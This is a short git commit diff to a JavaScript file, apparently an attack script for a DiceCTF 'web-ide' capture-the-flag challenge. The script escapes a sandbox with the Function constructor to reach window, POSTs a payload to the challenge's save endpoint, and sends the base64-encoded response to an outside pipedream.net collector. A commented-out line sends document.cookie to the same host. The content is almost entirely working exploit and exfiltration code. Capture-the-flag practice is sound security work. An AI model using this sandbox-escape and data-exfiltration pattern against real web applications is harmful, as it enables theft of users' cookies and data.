66349a7b4df535eda322ceef8f174109b8db1992
moderly <lexanic37@gmail.com>
2021-02-06 23:07:47 +0300

    sad

--- scr.js
+++ scr.js
@@ -3,6 +3,6 @@
 let window = (_=>0).constructor('return this')();
 // window.fetch('https://enali62mm21hu.x.pipedream.net?asd' + window.document.cookie);
 let oReq = new window.XMLHttpRequest();
-window.oReq.open('POST', 'https://web-ide.dicec.tf/ide/save');
-window.oReq.send(payload);
+oReq.open('POST', 'https://web-ide.dicec.tf/ide/save');
+oReq.send(payload);
 window.fetch('https://enali62mm21hu.x.pipedream.net?as=' + window.btoa(oReq.responseText));
